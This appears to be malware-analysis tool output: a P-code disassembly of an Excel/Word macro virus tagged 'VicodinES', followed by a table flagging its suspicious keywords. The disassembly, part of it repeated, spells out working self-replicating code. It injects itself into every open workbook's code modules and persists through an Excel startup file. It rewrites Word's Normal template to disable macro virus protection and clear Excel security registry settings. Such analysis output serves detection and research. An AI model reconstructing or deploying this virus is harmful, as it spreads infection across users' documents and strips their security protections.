' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #25:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Label out 
' Line #30:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #31:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #32:
' 	LitVarSpecial (True)
' 	St run1 
' Line #33:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #36:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #37:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #41:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #42:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #45:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #53:
' 	ElseBlock 
' Line #54:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #61:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Sub AbuseWord())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #67:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #68:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #69:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #72:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #73:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #74:
' 	ElseBlock 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #77:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #85:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #86:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet3 - 7885 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	EndWith 
' Line #11:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld vbCr 
' 	St v1 
' Line #17:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #18:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #19:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #20:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #21:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #25:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Label out 
' Line #30:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #31:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #32:
' 	LitVarSpecial (True)
' 	St run1 
' Line #33:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #36:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #37:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #41:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #42:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #45:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #53:
' 	ElseBlock 
' Line #54:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #61:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Sub AbuseWord())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #67:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #68:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #69:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #72:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #73:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #74:
' 	ElseBlock 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #77:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #85:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #86:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
